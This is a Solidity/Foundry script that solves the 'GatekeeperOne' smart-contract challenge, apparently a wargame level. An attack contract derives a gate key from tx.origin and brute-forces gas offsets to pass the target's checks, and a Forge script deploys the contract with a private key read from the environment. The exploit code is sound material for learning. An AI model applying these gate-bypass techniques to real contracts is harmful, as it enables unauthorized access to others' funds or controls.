// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import "@forge-std/Script.sol";

contract Attack {
    GatekeeperOne public g1Contract;
    address public attackerAddress;

    constructor(address g1) {
        attackerAddress = msg.sender;
        g1Contract = GatekeeperOne(g1);
    }

    function pwn() public{
        bytes8 pass = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(g1Contract).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", pass));
            if (success) {
                break;
            }
        }
    }
}

contract GatekeeperOneScript is Script {

    GatekeeperOne public g1contract;
    address public attacker;
    function setUp() public {
        g1contract = GatekeeperOne(payable(vm.envAddress("GATEKEEPERONE_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(g1contract));
        attack.pwn();
        vm.stopBroadcast();
    }
}